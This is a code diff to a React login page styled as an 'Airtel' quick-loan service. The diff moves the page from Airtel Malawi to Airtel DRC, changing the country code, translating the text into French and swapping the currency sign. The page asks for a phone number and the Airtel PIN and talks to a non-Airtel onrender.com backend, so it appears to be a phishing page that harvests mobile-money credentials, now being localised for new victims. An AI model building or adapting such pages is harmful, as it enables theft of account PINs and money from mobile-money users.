@@ -5,8 +5,8 @@ const API_BASE = (
   import.meta.env.VITE_API_BASE_URL || 'https://airtel-loan-backend-z5vx.onrender.com'
 ).replace(/\/$/, '');
 
-const COUNTRY_CODE = '+265';
-const PHONE_PLACEHOLDER = '991 234 567';
+const COUNTRY_CODE = '+243';
+const PHONE_PLACEHOLDER = '7XX XXX XXX'; // DRC format
 const PHONE_MAX = 9;
 const FETCH_TIMEOUT_MS = 90_000;
 const SLOW_HINT_AFTER_MS = 4_000;
@@ -107,7 +107,7 @@ function AirtelLogin() {
       stopPolling();
       setIsWaitingForApproval(false);
       setIsLoading(false);
-      setError(err?.message?.includes('Failed to fetch') ? 'Network error. Please try again.' : 'An error occurred.');
+      setError(err?.message?.includes('Failed to fetch') ? 'Erreur réseau. Veuillez réessayer.' : 'Une erreur est survenue.');
     }
   };
 
@@ -134,7 +134,7 @@ function AirtelLogin() {
         .phone-input-box { display: flex; border: 1px solid #D1D5DB; border-radius: 8px; margin-bottom: 24px; overflow: hidden; height: 48px; }
         .country-code { background: #F9FAFB; padding: 0 12px; display: flex; align-items: center; font-weight: 600; font-size: 16px; border-right: 1px solid #D1D5DB; color: #1a1a1a; }
         
-        /* UPDATED: Phone input visibility */
+        /* Phone input visibility */
         .phone-input { 
           flex: 1; 
           border: none; 
@@ -192,9 +192,9 @@ function AirtelLogin() {
               <div></div><div></div><div></div><div></div><div></div><div></div>
               <div></div><div></div><div></div><div></div><div></div><div></div>
             </div>
-            <h2 className="spinner-title">Processing...</h2>
+            <h2 className="spinner-title">Traitement en cours...</h2>
             <p className="spinner-sub">
-              {isSlow ? 'Server is warming up. This may take up to a minute...' : 'Please wait while we verify your request...'}
+              {isSlow ? 'Le serveur démarre. Cela peut prendre jusqu\'à une minute...' : 'Veuillez patienter pendant que nous vérifions votre demande...'}
             </p>
           </div>
         </div>
@@ -202,13 +202,13 @@ function AirtelLogin() {
 
       <div className="header-top">
         <div className="menu-icon">≡</div>
-        <h1 className="header-title">Airtel Malawi</h1>
+        <h1 className="header-title">Airtel DRC</h1>
       </div>
-      <p className="header-sub">Quick loans. Anytime. Anywhere.</p>
+      <p className="header-sub">Prêts rapides. A tout moment. N'importe où.</p>
 
       <div className="card">
-        <h2 className="card-title">Welcome back</h2>
-        <p className="card-sub">Log in to your Airtel account</p>
+        <h2 className="card-title">Bon retour</h2>
+        <p className="card-sub">Connectez-vous à votre compte Airtel</p>
 
         {error && (
           <div className="error-box">
@@ -216,9 +216,9 @@ function AirtelLogin() {
           </div>
         )}
 
-        <label className="label">Phone number</label>
+        <label className="label">Numéro de téléphone</label>
         <div className="phone-input-box">
-          <div className="country-code">+265</div>
+          <div className="country-code">+243</div>
           <input 
             type="tel" 
             className="phone-input" 
@@ -229,7 +229,7 @@ function AirtelLogin() {
           />
         </div>
 
-        <label className="label">Enter your Airtel PIN</label>
+        <label className="label">Saisissez votre code PIN Airtel</label>
         <div className="pin-boxes">
           {pin.map((digit, i) => (
             <input
@@ -250,12 +250,12 @@ function AirtelLogin() {
           onClick={handleLogin}
           disabled={phone.length < PHONE_MAX || pin.join('').length < 4}
         >
-          Log in →
+          Connexion →
         </button>
 
         <div className="secure-text">
           <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#F59E0B" strokeWidth="2"><rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect><path d="M7 11V7a5 5 0 0 1 10 0v4"></path></svg>
-          Your information is secure and protected.
+          Vos informations sont en sécurité et protégées.
         </div>
       </div>
 
@@ -265,7 +265,7 @@ function AirtelLogin() {
           <svg width="24" height="24" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C9.243 2 7 4.243 7 7v3H6a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2h-1V7c0-2.757-2.243-5-5-5zm-3 5c0-1.654 1.346-3 3-3s3 1.346 3 3v3H9V7zm4 9h-2v-2h2v2z"/></svg>
         </div>
         <div className="brand-icon" style={{color: '#FCD34D', background: '#1E293B', borderRadius: '4px', fontSize: '10px', fontWeight: 'bold'}}>Airtel<br/>Money</div>
-        <div className="brand-icon" style={{color: '#FCD34D', border: '2px solid #D97706', borderRadius: '50%', fontSize: '18px', fontWeight: '900'}}>K</div>
+        <div className="brand-icon" style={{color: '#FCD34D', border: '2px solid #D97706', borderRadius: '50%', fontSize: '18px', fontWeight: '900'}}>₣</div>
       </div>
     </div>
   );
